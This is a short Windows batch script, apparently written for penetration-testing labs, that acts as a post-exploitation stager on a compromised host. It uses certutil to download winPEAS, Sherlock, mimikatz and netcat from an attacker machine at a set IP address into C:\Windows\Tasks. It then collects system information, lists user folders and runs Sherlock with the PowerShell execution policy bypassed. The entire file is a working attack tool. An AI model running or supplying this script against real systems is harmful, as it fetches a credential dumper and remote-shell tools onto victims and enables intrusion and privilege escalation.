:: Script to automatically download post-exploitation files from attacker / kali machine to victim
:: Downloads winpeas, sherlock, mimikatz, netcat
:: Runs sysinfo and sherlock automatically
:: Edit kali IP address before use!

@echo off
set kali=10.10.14.4
echo [+] Downloading files from %kali%
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/winPEAS.bat" C:\Windows\Tasks\winPEAS.bat
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/Sherlock.ps1" C:\Windows\Tasks\Sherlock.ps1
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/mimikatz_trunk/Win32/mimikatz.exe" C:\Windows\Tasks\mimikatz32.exe
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/mimikatz_trunk/x64/mimikatz.exe" C:\Windows\Tasks\mimikatz64.exe
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/netcat/nc.exe" C:\Windows\Tasks\nc.exe
certutil.exe -urlcache -split -f "http://%kali%/tools/windows/netcat/nc64.exe" C:\Windows\Tasks\nc64.exe
echo [#######################################################]
echo [+] System information
systeminfo
echo [#######################################################]
echo [+] User folder
tree /F C:\Users
echo [#######################################################]
echo [+] Running Sherlock.ps1
powershell -exec bypass -File C:\Windows\Tasks\Sherlock.ps1
echo [#######################################################]
@echo on

